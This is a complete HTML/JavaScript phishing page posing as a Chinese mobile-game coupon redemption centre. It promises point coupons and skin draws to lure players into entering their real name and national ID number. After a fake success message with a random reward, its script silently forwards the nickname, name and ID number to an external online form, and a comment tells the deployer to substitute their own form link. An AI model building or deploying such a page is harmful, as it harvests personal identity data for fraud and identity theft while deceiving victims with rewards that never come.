<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>活动兑换中心</title>
  <style>
    body {
      margin: 0;
      font-family: "PingFang SC", "Microsoft YaHei", sans-serif;
      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
      background-size: cover;
      color: white;
      text-align: center;
      padding: 20px;
    }
    .container {
      max-width: 480px;
      margin: auto;
      background: rgba(0, 0, 0, 0.6);
      padding: 20px;
      border-radius: 12px;
      box-shadow: 0 0 20px rgba(255, 255, 255, 0.1);
    }
    h1 {
      font-size: 24px;
      margin-bottom: 20px;
      color: #f9d342;
    }
    select, input {
      width: 100%;
      padding: 10px;
      margin-top: 10px;
      font-size: 16px;
      border-radius: 6px;
      border: none;
    }
    input.error, select.error {
      border: 2px solid #ff4d4f;
    }
    .error-msg {
      color: #ff4d4f;
      font-size: 13px;
      text-align: left;
      margin-top: 4px;
    }
    button {
      margin-top: 20px;
      width: 100%;
      padding: 12px;
      font-size: 16px;
      background-color: #f9d342;
      color: #000;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      transition: background 0.3s;
    }
    button:disabled {
      background-color: #888;
      cursor: not-allowed;
    }
    .result {
      margin-top: 20px;
      font-size: 16px;
      line-height: 1.5;
    }
    .announcement {
      margin-top: 30px;
      background: rgba(255,255,255,0.1);
      padding: 12px;
      border-radius: 8px;
      font-size: 14px;
      text-align: left;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>活动兑换中心</h1>
    <form id="form">
      <select id="region">
        <option value="">请选择区服</option>
        <option value="微信区">微信区</option>
        <option value="QQ区">QQ区</option>
      </select>
      <div id="regionError" class="error-msg"></div>

      <input type="text" id="nickname" placeholder="请输入游戏昵称"/>
      <!-- 昵称无格式限制 -->

      <input type="text" id="realname" placeholder="请输入实名（1-5位中文）"/>
      <div id="nameError" class="error-msg"></div>

      <input type="text" id="idcard" placeholder="请输入18位身份证号码"/>
      <div id="idError" class="error-msg"></div>

      <button type="submit" id="submitBtn">提交认证</button>
    </form>

    <div class="result" id="resultBox" style="display: none;"></div>

    <div class="announcement">
      <strong>活动公告：</strong><br/>
      本次认证可获得60/300/680/1280/1980/3280/6480点券，认证成功还可获得皮肤抽奖机会与钥匙兑换券，所有奖励将在24小时内发放到账，请耐心等待。如未到账请联系客服进行人工核实。
    </div>
  </div>

  <script>
    const form = document.getElementById("form");
    const submitBtn = document.getElementById("submitBtn");
    const resultBox = document.getElementById("resultBox");

    function isChineseName(name) {
      return /^[\u4e00-\u9fa5]{1,5}$/.test(name);
    }

    function isValidID(id) {
      return /^[1-9]\d{5}(19|20)\d{2}(0[1-9]|1[0-2])(0[1-9]|[12]\d|3[01])\d{3}[\dXx]$/.test(id);
    }

    function randomReward() {
      return Math.random() < 0.01 ? 300 : 60;
    }

    form.addEventListener("submit", function (e) {
      e.preventDefault();

      // 清除错误提示
      document.querySelectorAll(".error-msg").forEach(el => el.textContent = '');
      document.querySelectorAll("input, select").forEach(el => el.classList.remove("error"));

      const region = document.getElementById("region").value;
      const nickname = document.getElementById("nickname").value.trim();
      const realname = document.getElementById("realname").value.trim();
      const idcard = document.getElementById("idcard").value.trim();

      let valid = true;

      if (!region) {
        document.getElementById("regionError").textContent = "请选择区服";
        document.getElementById("region").classList.add("error");
        valid = false;
      }

      if (!isChineseName(realname)) {
        document.getElementById("nameError").textContent = "请输入1-5位中文姓名";
        document.getElementById("realname").classList.add("error");
        valid = false;
      }

      if (!isValidID(idcard)) {
        document.getElementById("idError").textContent = "请输入合法的18位身份证号";
        document.getElementById("idcard").classList.add("error");
        valid = false;
      }

      if (!valid) return;

      // 模拟提交结果
      const reward = randomReward();
      resultBox.innerHTML = `
        <p style="color:#0f0;">您已成功提交认证，请勿重复提交</p>
        <p>恭喜获得<span style="color:gold;">${reward}</span> 点券，点券将在24小时之内到账。</p>
        <button disabled>您已提交</button>
      `;
      resultBox.style.display = "block";
      submitBtn.disabled = true;

      // 发送至问卷平台（替换为你自己的链接）
      const url = "https://docs.qq.com/form/page/DYNAMIC_FORM_ID";
      const fullURL = `${url}?nickname=${encodeURIComponent(nickname)}&realname=${encodeURIComponent(realname)}&idcard=${encodeURIComponent(idcard)}&region=${encodeURIComponent(region)}&reward=${reward}`;
      fetch(fullURL);
    });
  </script>
</body>
</html>
